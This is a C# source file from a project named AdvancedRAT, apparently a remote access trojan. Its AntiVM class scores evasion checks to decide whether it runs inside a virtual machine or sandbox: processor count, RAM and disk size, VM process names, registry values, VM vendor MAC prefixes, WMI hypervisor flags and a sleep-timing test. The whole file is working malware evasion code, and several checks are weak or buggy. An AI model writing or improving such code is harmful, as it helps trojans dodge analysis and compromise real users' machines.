using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace AdvancedRAT.Core.Security
{
    public class AntiVM
    {
        [DllImport("kernel32.dll")]
        private static extern bool GetVolumeInformation(
            string lpRootPathName,
            string lpVolumeNameBuffer,
            uint nVolumeNameSize,
            out uint lpVolumeSerialNumber,
            out uint lpMaximumComponentLength,
            out uint lpFileSystemFlags,
            string lpFileSystemNameBuffer,
            uint nFileSystemNameSize);

        [DllImport("kernel32.dll")]
        private static extern bool SetEndOfFile(IntPtr hFile);

        public static bool IsRunningInVM()
        {
            int vmIndicators = 0;
            
            // Check 1: Number of processors (VMs often have 1 or 2 cores)
            if (Environment.ProcessorCount < 4)
                vmIndicators++;
            
            // Check 2: RAM size (less than 4GB might indicate VM)
            if (GetTotalRAM() < 4096) // Less than 4GB
                vmIndicators++;
            
            // Check 3: Screen resolution (unusual for VMs)
            if (IsUnusualScreenResolution())
                vmIndicators++;
            
            // Check 4: VM-specific processes
            if (HasVMProcesses())
                vmIndicators++;
            
            // Check 5: VM-specific hardware IDs
            if (HasVMHardwareIDs())
                vmIndicators++;
            
            // Check 6: VM-specific registry keys
            if (HasVMRegistryKeys())
                vmIndicators++;
            
            // Check 7: Suspicious MAC addresses
            if (HasVMMACAddress())
                vmIndicators++;
            
            // Check 8: Disk size (smaller disks are common in VMs)
            if (GetDiskSize() < 100) // Less than 100GB
                vmIndicators++;
            
            // Check 9: CPU vendor check (VMs might have specific vendors)
            if (HasVMCPUSignature())
                vmIndicators++;
            
            // Check 10: Hypervisor detection via CPUID
            if (IsHypervisorPresent())
                vmIndicators++;
            
            // If we detect 3 or more indicators, consider it a VM
            return vmIndicators >= 3;
        }
        
        private static long GetTotalRAM()
        {
            try
            {
                foreach (ManagementObject obj in new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory").Get())
                {
                    return Convert.ToInt64(obj["Capacity"]) / (1024 * 1024); // Convert to MB
                }
            }
            catch {}
            return 0;
        }
        
        private static bool IsUnusualScreenResolution()
        {
            try
            {
                // This would normally require Windows Forms or similar to check screen resolution
                // For now, we'll skip this check
                return false;
            }
            catch
            {
                return true;
            }
        }
        
        private static bool HasVMProcesses()
        {
            string[] vmProcesses = {
                "vmware", "vbox", "vagrant", "qemu", "xen", "hyperv", "parallels",
                "VGAuthService", "VMwareService", "vmsrvc", "vm3dservice",
                "vmtoolsd", "vmwaretray", "vmwareuser", "vboxservice", "vboxtray"
            };
            
            Process[] processes = Process.GetProcesses();
            foreach (Process proc in processes)
            {
                string procName = proc.ProcessName.ToLower();
                foreach (string vmProc in vmProcesses)
                {
                    if (procName.Contains(vmProc))
                    {
                        Console.WriteLine($"VM process detected: {proc.ProcessName}");
                        return true;
                    }
                }
            }
            return false;
        }
        
        private static bool HasVMHardwareIDs()
        {
            try
            {
                foreach (ManagementObject mo in new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem").Get())
                {
                    string manufacturer = mo["Manufacturer"].ToString().ToLower();
                    string model = mo["Model"].ToString().ToLower();
                    
                    if (manufacturer.Contains("microsoft") && model.Contains("virtual"))
                        return true;
                    if (manufacturer.Contains("vmware"))
                        return true;
                    if (manufacturer.Contains("virtualbox"))
                        return true;
                    if (manufacturer.Contains("parallels"))
                        return true;
                    if (model.Contains("virtual"))
                        return true;
                    if (model.Contains("vmware"))
                        return true;
                    if (model.Contains("qemu"))
                        return true;
                    if (model.Contains("bochs"))
                        return true;
                }
            }
            catch {}
            
            try
            {
                foreach (ManagementObject mo in new ManagementObjectSearcher("SELECT * FROM Win32_Processor").Get())
                {
                    string name = mo["Name"].ToString().ToLower();
                    if (name.Contains("virtual") || name.Contains("vmware") || name.Contains("qemu"))
                        return true;
                }
            }
            catch {}
            
            return false;
        }
        
        private static bool HasVMRegistryKeys()
        {
            string[] vmRegPaths = {
                @"HARDWARE\DESCRIPTION\System\BIOS", 
                @"SYSTEM\CurrentControlSet\Services\Disk\Enum"
            };
            
            string[] vmRegValues = {
                "vbox", "vmware", "qemu", "xen", "virtualbox", "parallels", "hyperv"
            };
            
            foreach (string regPath in vmRegPaths)
            {
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath))
                    {
                        if (key != null)
                        {
                            foreach (string valueName in key.GetValueNames())
                            {
                                object value = key.GetValue(valueName);
                                if (value != null)
                                {
                                    string valueStr = value.ToString().ToLower();
                                    foreach (string vmValue in vmRegValues)
                                    {
                                        if (valueStr.Contains(vmValue))
                                        {
                                            Console.WriteLine($"VM registry value detected: {valueName}={valueStr}");
                                            return true;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch {}
            }
            
            return false;
        }
        
        private static bool HasVMMACAddress()
        {
            try
            {
                foreach (ManagementObject mo in new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True").Get())
                {
                    string mac = mo["MACAddress"].ToString();
                    if (!string.IsNullOrEmpty(mac))
                    {
                        // VMware MAC addresses start with these OUIs
                        if (mac.StartsWith("00:50:56") || mac.StartsWith("00:0C:29") || mac.StartsWith("00:05:69"))
                            return true;
                        // VirtualBox MAC addresses start with these OUIs
                        if (mac.StartsWith("08:00:27"))
                            return true;
                        // Parallels MAC addresses start with these OUIs
                        if (mac.StartsWith("00:1C:42"))
                            return true;
                    }
                }
            }
            catch {}
            
            return false;
        }
        
        private static long GetDiskSize()
        {
            try
            {
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo drive in drives)
                {
                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                    {
                        return drive.TotalSize / (1024 * 1024 * 1024); // Convert to GB
                    }
                }
            }
            catch {}
            
            return 0;
        }
        
        private static bool HasVMCPUSignature()
        {
            // This would require direct CPUID instruction access
            // For now, we'll implement a basic version
            try
            {
                string cpuId = "";
                foreach (ManagementObject mo in new ManagementObjectSearcher("SELECT * FROM Win32_Processor").Get())
                {
                    cpuId = mo["ProcessorId"].ToString().ToLower();
                    if (cpuId.Contains("vmware") || cpuId.Contains("virtual") || cpuId.Contains("xen"))
                        return true;
                }
            }
            catch {}
            
            return false;
        }
        
        private static bool IsHypervisorPresent()
        {
            // Basic check for hypervisor presence using WMI
            try
            {
                foreach (ManagementObject mo in new ManagementObjectSearcher("SELECT HyperVisorPresent FROM Win32_ComputerSystem").Get())
                {
                    if (mo["HyperVisorPresent"] != null && (bool)mo["HyperVisorPresent"])
                        return true;
                }
            }
            catch {}
            
            return false;
        }
        
        public static bool SandboxTimingCheck()
        {
            try
            {
                var start = Environment.TickCount;
                System.Threading.Thread.Sleep(100); // Sleep for 100ms
                var end = Environment.TickCount;
                
                // If the actual sleep time is significantly different from expected,
                // we might be in a sandbox
                var elapsed = end - start;
                if (elapsed < 80 || elapsed > 120) // Allow some variance
                {
                    Console.WriteLine($"Sandbox timing anomaly detected: slept for {elapsed}ms instead of ~100ms");
                    return true;
                }
            }
            catch {}
            
            return false;
        }
        
        public static bool IsSignedByMicrosoft()
        {
            try
            {
                string assemblyPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                
                // Use signtool to check signature (would require signtool to be present)
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "signtool.exe",
                    Arguments = $"verify /pa \"{assemblyPath}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };
                
                using (Process proc = Process.Start(startInfo))
                {
                    proc?.WaitForExit(10000);
                    string output = proc?.StandardOutput.ReadToEnd();
                    return output?.Contains("Signature verified") ?? false;
                }
            }
            catch
            {
                // Alternative method: check if the process itself is signed
                // This is a simplified check - a real implementation would use proper certificate validation
                return false;
            }
        }
    }
}